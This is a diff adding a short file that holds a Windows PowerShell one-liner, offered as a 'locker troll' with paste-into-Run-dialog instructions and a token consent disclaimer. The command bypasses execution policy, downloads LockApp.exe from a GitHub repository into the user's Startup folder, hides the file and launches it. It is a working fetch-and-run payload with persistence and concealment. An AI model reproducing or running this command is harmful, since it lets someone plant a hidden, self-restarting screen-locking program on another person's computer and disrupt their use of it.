@@ -1,0 +1,10 @@
+#Copy and Paste the command in run dialog. If it doesn't work, copy and paste it in powershell.
+#This command downloads the LockApp executable to the user's startup directory for persistence if you want to make the troll persistent.
+#Remember to get full consent first before trying this & this is for educational purposes ONLY.
+
+
+powershell -ExecutionPolicy Bypass -Command "(New-Object System.Net.WebClient).DownloadFile('https://github.com/orgamino/Windows-Locker-Troll/raw/main/LockApp.exe', '$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\LockApp.exe'); attrib +h '$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\LockApp.exe'; Start-Process -FilePath '$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\LockApp.exe'"
+
+
+
+
